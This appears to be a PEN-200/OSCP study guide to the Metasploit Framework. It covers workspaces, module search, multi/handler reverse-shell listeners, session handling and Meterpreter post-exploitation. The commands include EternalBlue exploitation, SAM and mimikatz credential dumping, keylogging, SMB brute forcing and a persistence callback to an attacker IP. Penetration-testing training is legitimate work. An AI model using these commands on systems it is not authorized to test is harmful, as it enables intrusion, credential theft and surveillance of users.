# Metasploit Framework Usage Guide (PEN-200 Module 15)

Metasploit is restricted to **one machine** on the OSCP exam — but on that one machine it's the most efficient tool available. Know the workflow cold so you don't waste time fumbling with it under pressure.

> **Exam restriction (2026):** You may use Metasploit modules (exploit, auxiliary, post) and Meterpreter on exactly one standalone target. The AD set is off-limits for Metasploit. `msfvenom` for payload generation is unrestricted on all targets. `multi/handler` as a plain listener (catching non-Meterpreter shells) is unrestricted. See [`EXAM-TIPS.md`](../EXAM-TIPS.md) §2 for the full policy.

## 1. msfconsole Basics

```bash
# Launch (quiet mode skips the banner)
msfconsole -q

# Database setup (enables host/service tracking)
sudo systemctl start postgresql
msfdb init
msfconsole -q
db_status                       # confirm "Connected to msf"
```

### Workspace Management

```bash
workspace                       # list workspaces
workspace -a exam-target3       # create workspace for this target
workspace exam-target3          # switch to it
workspace -d old-workspace      # delete
```

Workspaces isolate hosts/services/loot per target — use one per exam machine.

### Database-Driven Recon

```bash
# Import nmap results directly
db_nmap -sV -sC -p- <target_ip>

# Or import from a file
db_import /path/to/nmap-scan.xml

# Query collected data
hosts                           # list discovered hosts
services                        # list all services
services -p 80,443              # filter by port
vulns                           # list matched vulnerabilities
creds                           # credentials found by modules
loot                            # files/data collected by post modules
```

## 2. Finding and Configuring Modules

```bash
# Search for modules
search apache 2.4.49
search type:exploit platform:windows smb
search cve:2021-34527           # PrintNightmare

# Use a module
use exploit/windows/smb/ms17_010_eternalblue

# View module info
info
show options                    # required settings
show payloads                   # compatible payloads
show targets                    # supported target configurations
show advanced                   # advanced options

# Configure
set RHOSTS <target_ip>
set LHOST tun0                  # auto-resolves your VPN IP
set LPORT 443
set payload windows/x64/meterpreter/reverse_tcp

# Run
exploit
# or: run
# or: exploit -j   (run as background job)
```

### Module Types

| Type | Purpose | Example |
|------|---------|---------|
| `exploit` | Deliver a payload via a vulnerability | `exploit/windows/smb/ms17_010_eternalblue` |
| `auxiliary` | Scanning, fuzzing, brute-forcing (no payload) | `auxiliary/scanner/smb/smb_version` |
| `post` | Post-exploitation on an existing session | `post/windows/gather/hashdump` |
| `encoder` | Encode payloads to evade detection | `encoder/x86/shikata_ga_nai` |
| `evasion` | Generate AV-evasive executables | `evasion/windows/windows_defender_exe` |

## 3. multi/handler — The Universal Listener

Use `multi/handler` to catch any msfvenom-generated payload callback. This is unrestricted on the exam.

```bash
use exploit/multi/handler

# Match the payload to what you generated with msfvenom
set payload windows/x64/shell_reverse_tcp
set LHOST tun0
set LPORT 443

# Run in foreground
exploit

# Run in background (for multiple callbacks)
exploit -j
```

**One-liner launcher (useful for quick setup):**
```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 443; exploit"
```

## 4. Session Management

```bash
# Background current session
background
# or: Ctrl+Z

# List sessions
sessions
sessions -l                     # detailed list

# Interact with a session
sessions -i 1                   # interact with session 1

# Upgrade a shell to Meterpreter (if you started with a plain shell)
sessions -u 1

# Kill a session
sessions -k 1

# Run a command on a session without interacting
sessions -C "sysinfo" -i 1

# Route traffic through a session (for pivoting)
route add 10.10.10.0/24 1      # route subnet through session 1
```

## 5. Meterpreter Post-Exploitation

Meterpreter is the most capable payload — only use it on your one allowed Metasploit machine.

### System Information & Navigation

```bash
sysinfo                         # OS, architecture, domain
getuid                          # current user
getpid                          # current process ID
ps                              # list processes

pwd                             # current directory
ls                              # list files
cd C:\\Users                     # change directory
cat C:\\Users\\admin\\Desktop\\proof.txt

download C:\\Users\\admin\\Desktop\\proof.txt /tmp/
upload /tmp/winPEAS.exe C:\\Temp\\
```

### Privilege Escalation

```bash
getsystem                       # attempt automatic privesc (named pipe impersonation)
# If getsystem fails, try:
getsystem -t 1                  # Service - Named Pipe Impersonation (In Memory/Admin)
getsystem -t 2                  # Service - Named Pipe Impersonation (Dropper/Admin)
getsystem -t 3                  # Service - Token Duplication (In Memory/Admin)
getsystem -t 4                  # Named Pipe Impersonation (RPCSS variant)
```

### Process Migration

```bash
# Migrate to a more stable/privileged process
ps                              # find a SYSTEM process (e.g., winlogon.exe, lsass.exe)
migrate <PID>

# Auto-migrate to a suitable process
run post/windows/manage/migrate
```

### Credential Harvesting

```bash
hashdump                        # dump SAM hashes (requires SYSTEM)

# Mimikatz (kiwi extension)
load kiwi
creds_all                       # dump all credentials
creds_msv                       # NTLM hashes
creds_kerberos                  # Kerberos tickets
lsa_dump_sam                    # SAM database
lsa_dump_secrets                # LSA secrets
```

### Network & Pivoting

```bash
ipconfig                        # network interfaces
arp                             # ARP table
netstat                         # active connections
route                           # routing table

# Port forwarding through Meterpreter
portfwd add -l 3389 -p 3389 -r <internal_ip>
portfwd list
portfwd delete -l 3389

# Autoroute for pivoting
run post/multi/manage/autoroute
# or manually:
run autoroute -s 10.10.10.0/24
```

### Other Useful Commands

```bash
shell                           # drop to a system shell
execute -f cmd.exe -i -H        # execute a process (hidden, interactive)
screenshare                     # live screen viewing
keyscan_start                   # start keylogger
keyscan_dump                    # dump keystrokes
keyscan_stop

# Persistence (reference only — use cautiously)
run persistence -U -i 10 -p 4444 -r <attacker_ip>
```

## 6. Useful Auxiliary Modules

```bash
# SMB version detection
use auxiliary/scanner/smb/smb_version
set RHOSTS <target>
run

# SMB login brute force
use auxiliary/scanner/smb/smb_login
set RHOSTS <target>
set USER_FILE /usr/share/wordlists/users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# HTTP directory scanner
use auxiliary/scanner/http/dir_scanner
set RHOSTS <target>
run

# FTP anonymous check
use auxiliary/scanner/ftp/anonymous
set RHOSTS <target>
run
```

## 7. Post Modules

```bash
# Run a post module against an existing session
use post/windows/gather/hashdump
set SESSION 1
run

# Enumerate installed software
run post/windows/gather/enum_applications

# Enumerate logged-on users
run post/windows/gather/enum_logged_on_users

# Check for exploitable vulns
run post/multi/recon/local_exploit_suggester
# This is extremely useful — it checks the target for known privesc vulns
```

## 8. Exam Strategy for Your One Metasploit Machine

1. **Pick the right machine.** Save Metasploit for the target that's hardest to exploit manually — usually the one where you found a vuln but the public exploit is unreliable or needs heavy adaptation.
2. **Set up the workspace** before touching the target: `workspace -a exam-msf-target`.
3. **db_nmap first** so all services are tracked.
4. **Use `local_exploit_suggester`** after getting initial access — it may find a privesc path you'd miss manually.
5. **Capture proof immediately** after escalating — `cat C:\\Users\\Administrator\\Desktop\\proof.txt` and screenshot.
6. **Don't burn Metasploit on an easy target.** If you can exploit it with a public PoC + nc listener, do that and save MSF for where you need it.

## References

- PEN-200 Module 15: The Metasploit Framework
- https://docs.metasploit.com
- https://www.offsec.com/metasploit-unleashed/ (free Metasploit course by OffSec)
- See also: [`CHEATSHEET.md`](../CHEATSHEET.md) §5 for msfvenom payload generation
